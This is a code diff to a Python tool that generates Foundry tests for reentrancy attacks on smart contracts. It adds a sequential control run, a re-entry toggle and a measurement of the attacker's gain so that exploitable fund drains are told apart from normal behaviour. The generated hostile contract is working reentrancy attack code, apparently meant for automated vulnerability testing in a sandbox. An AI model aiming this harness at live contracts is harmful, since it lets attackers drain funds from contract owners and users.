@@ -1544,8 +1544,10 @@ def _render_reentrancy_test(
     setup_signature: str | None = None,
     seed_fund: str | None = None,
     entitlement_signature: str | None = None,
+    call_value: str = "0",
 ):
     target_lit = f"address(uint160(0x00{target.address[2:].lower()}))"
+    attack_value = "0" if str(call_value).strip().lower() in {"0", "0wei"} else _solidity_amount_literal(call_value)
     params = list(fn.get("inputs") or [])
     expressions = [
         _basic_solidity_expr(str(item.get("type") or ""), str(value))
@@ -1622,6 +1624,7 @@ contract LowkeyBreakReentrant {{
     bytes public payload;
     uint256 public attempts;
     uint256 public successes;
+    bool public reentryEnabled = true;
     bool public lastSeedSuccess;
     bool public lastAttackSuccess;
     bytes public lastSeedReturndata;
@@ -1642,11 +1645,24 @@ contract LowkeyBreakReentrant {{
         emit TargetCall("SEED", ok, returndata);
     }}
 
+    function setReentryEnabled(bool enabled) external {{
+        reentryEnabled = enabled;
+    }}
+
     function attack() external payable {{
         (bool ok, bytes memory returndata) = target.call{{value: msg.value}}(payload);
         lastAttackSuccess = ok;
         lastAttackReturndata = returndata;
         emit TargetCall("OUTER", ok, returndata);
+    }}
+
+    // Sequential control: the same number of target calls without nested callbacks.
+    function attackSequential(uint256 repeats) external payable {{
+        for (uint256 i = 0; i < repeats; i++) {{
+            uint256 forwarded = i == 0 ? msg.value : 0;
+            (bool ok, bytes memory returndata) = target.call{{value: forwarded}}(payload);
+            emit TargetCall("CONTROL", ok, returndata);
+        }}
     }}
 
     event TargetCall(string phase, bool success, bytes returndata);
@@ -1660,7 +1676,7 @@ contract LowkeyBreakReentrant {{
     }}
 
     function _reenter() internal {{
-        if (attempts >= {max(1, depth)}) return;
+        if (!reentryEnabled || attempts >= {max(1, depth)}) return;
         attempts++;
         (bool ok, ) = target.call(payload);
         if (ok) successes++;
@@ -1677,14 +1693,33 @@ contract LowkeyBreakReentrancy is Test {{
         vm.deal(address(this), 100 ether);
         vm.deal(address(hostile), 100 ether);
 {setup_block}
-        uint256 beforeHostile = address(hostile).balance;
-        uint256 beforeTarget = TARGET.balance;
         uint256 entitlementBeforeAttack = 0;
         bool entitlementBeforeAttackOk = false;
 
 {entitlement_before_attack_block}
 
-        (bool outer, ) = address(hostile).call{{value: 1 wei}}(
+        // Run a sequential control from the same setup and actor. The state
+        // snapshot ensures the reentrant attempt starts from identical target state.
+        uint256 controlSnapshot = vm.snapshotState();
+        uint256 controlSideBefore = address(this).balance + address(hostile).balance;
+        uint256 controlTargetBefore = TARGET.balance;
+        hostile.setReentryEnabled(false);
+        (bool controlOuter, ) = address(hostile).call{{value: {attack_value}}}(
+            abi.encodeWithSignature("attackSequential(uint256)", uint256({max(1, depth) + 1}))
+        );
+        uint256 controlSideAfter = address(this).balance + address(hostile).balance;
+        uint256 controlGain = controlSideAfter > controlSideBefore
+            ? controlSideAfter - controlSideBefore : 0;
+        uint256 controlTargetAfter = TARGET.balance;
+        uint256 controlTargetLoss = controlTargetBefore > controlTargetAfter
+            ? controlTargetBefore - controlTargetAfter : 0;
+        require(vm.revertToState(controlSnapshot), "LOWKEY_CONTROL_REVERT_FAILED");
+        hostile.setReentryEnabled(true);
+
+        uint256 beforeHostile = address(hostile).balance;
+        uint256 beforeTarget = TARGET.balance;
+        uint256 attackerSideBefore = address(this).balance + address(hostile).balance;
+        (bool outer, ) = address(hostile).call{{value: {attack_value}}}(
             abi.encodeWithSignature("attack()")
         );
 
@@ -1693,13 +1728,23 @@ contract LowkeyBreakReentrancy is Test {{
         uint256 entitlementAfterAttack = 0;
 {entitlement_after_attack_block}
 
-        uint256 outerInput = 1 wei;
+        uint256 outerInput = {attack_value};
         uint256 received = afterHostile > beforeHostile + outerInput
             ? afterHostile - beforeHostile - outerInput
             : 0;
+        uint256 attackerSideAfter = address(this).balance + address(hostile).balance;
+        uint256 measuredAttackerGain = attackerSideAfter > attackerSideBefore
+            ? attackerSideAfter - attackerSideBefore : 0;
         uint256 targetLoss = beforeTarget > afterTarget ? beforeTarget - afterTarget : 0;
+        bool controlDifferential = measuredAttackerGain > controlGain
+            && targetLoss > controlTargetLoss;
 
         console2.log("LOWKEY_BREAK_FAMILY", "reentrancy");
+        console2.log("CONTROL_OUTER_SUCCESS", controlOuter);
+        console2.log("CONTROL_GAIN", controlGain);
+        console2.log("CONTROL_TARGET_LOSS", controlTargetLoss);
+        console2.log("CONTROL_DIFFERENTIAL", controlDifferential);
+        console2.log("MEASURED_ATTACKER_GAIN", measuredAttackerGain);
         console2.log("HOSTILE_WRAPPER_SUCCESS", outer);
         console2.log("TARGET_SETUP_SUCCESS", hostile.lastSeedSuccess());
         console2.log("TARGET_SETUP_RETURNDATA_LENGTH", hostile.lastSeedReturndata().length);
@@ -1725,13 +1770,13 @@ contract LowkeyBreakReentrancy is Test {{
 
         bool exceededEntitlement = entitlementBeforeAttackOk
             && hostile.successes() > 0
-            && received > entitlementBeforeAttack;
+            && received > entitlementBeforeAttack
+            && controlDifferential;
         bool genericValueBreak = !entitlementBeforeAttackOk
             && hostile.successes() > 0
-            && received > 1 wei
-            && targetLoss > 1 wei;
+            && controlDifferential;
 
-        if (exceededEntitlement || genericValueBreak) {{
+        if (controlOuter && (exceededEntitlement || genericValueBreak)) {{
             console2.log("LOWKEY_BREAK", true);
         }} else {{
             console2.log("LOWKEY_BREAK", false);
@@ -2221,6 +2266,7 @@ def _run_family(host, config, rpc: str, target: Target, fn: dict[str, Any], fami
                 setup_signature,
                 seed_fund=seed_fund,
                 entitlement_signature=entitlement_signature,
+                call_value=value,
             )
         except ValueError as error:
             return AttackResult(
